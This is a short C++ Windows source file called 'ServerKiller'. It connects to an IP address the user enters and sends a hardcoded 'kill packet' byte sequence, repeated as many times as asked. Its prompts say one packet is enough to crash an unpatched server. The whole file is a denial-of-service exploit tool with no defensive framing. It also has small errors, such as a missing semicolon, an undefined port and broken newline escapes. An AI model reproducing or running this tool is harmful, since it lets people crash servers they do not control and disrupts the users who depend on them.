#include "stdafx.h"
#include "ServerKiller.h"
#include <winsock2.h>
#include <iostream>
#include <string>

CWinApp theApp;

using namespace std;

int _tmain()
{
    AfxWinInit(::GetModuleHandle(NULL), NULL,::GetCommandLine(), 0)
    
    SOCKET lhSocket;
    SOCKADDR_IN lSockAddr;
    WSADATA wsaData;
    int lConnect, lLength;
    string IP;
    
    
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        cout << "Socket Initialization Error.n";
    }
    
    lhSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (lhSocket == INVALID_SOCKET) {
        cout << "Invalid Socket " << GetLastError() << "n" << endl;
    }
    
    memset(&lSockAddr, 0, sizeof(lSockAddr));
    lSockAddr.sin_family = AF_INET;
    lSockAddr.sin_port = htons(PORT);
    
    
    cout << "IP Address:";
    cin >> IP;
    
    const char *IPaddr = IP.c_str();
    lSockAddr.sin_addr.s_addr = inet_addr(IPaddr);
    
    lConnect = connect(lhSocket, (SOCKADDR *) & lSockAddr, sizeof(SOCKADDR_IN));
    if (lConnect != 0) {
        cout << "Connecting to: " << IP << " failedn";
    }
    
    cout << "succesfully connected";
    char lData[] = {
        0xAA, 0x55, 0x0F, 0x00, 0x7F, 0x0C, 0x00, 0x77,
        0x6E, 0x72, 0x64, 0x6A, 0x71, 0x6A, 0x66, 0x75,
        0x21, 0x21, 0x21, 0x55, 0xAA
    };
    
    int size = sizeof(lData) / sizeof(lData[0]), i, count;
    cout << "How many packets to send? (Only needs 1 unless they have fix)n";
    cin >> count;
    
    for (i = 0; i < count; i++) {
        lLength = send(lhSocket, lData, size, 0);
        if (lLength < strlen(lData)) {
            cout << "Error sending packetn";
        }
    }
    
    cout << "successfully sent " << i << " kill packetsn";
    closesocket(lhSocket);
    
    cin.get();
    return 0;
    
}
